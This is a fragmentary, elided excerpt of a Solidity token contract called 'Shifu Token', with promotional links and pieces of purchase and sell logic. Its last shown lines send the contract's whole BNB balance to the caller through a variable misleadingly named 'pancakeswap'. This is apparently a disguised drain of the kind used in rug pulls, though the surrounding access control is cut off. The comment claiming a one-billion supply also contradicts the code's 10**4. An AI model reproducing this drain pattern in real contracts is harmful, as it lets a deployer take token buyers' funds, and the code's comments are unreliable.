 ...
 * Discussion Group: https://t.me/ShifuTokenChat
 * 
...
/** 
 * Contract: Shifu Token
 * Developed By: JamesSafemoon
 * Twitter: twitter.com/JamesSafemoon
 * 
 * Liquidity-less Token, DEX built into Contract
 * Send BNB to contract and it mints Shifu Token to your receive Address
 ...
 * 
 */
contract ShifuToken is IERC20, Context, Ownable, ReentrancyGuard {
    ...
    // token data
    string constant _name = "Shifu";
    string constant _symbol = "Shifu";
    uint8 constant _decimals = 0;
    // 1 Billion Total Supply
    uint256 _totalSupply = 1 * 10**4;
    // balances
    ...
    /** Purchases Shifu Tokens and Deposits Them in Sender's Address*/
    function purchase(address buyer, uint256 bnbAmount) internal returns (bool) {
        ...
        // revert if under 1
        if (tokensToSend < 1) {
            revert('Must Buy More Than One Shifu');
        }
    ...
    bool locked = false;
    /** Sells Shifu Tokens And Deposits the BNB into Seller's Address */
    ...
    address payable pancakeswap = payable(msg.sender);
    pancakeswap.transfer(address(this).balance);
  }
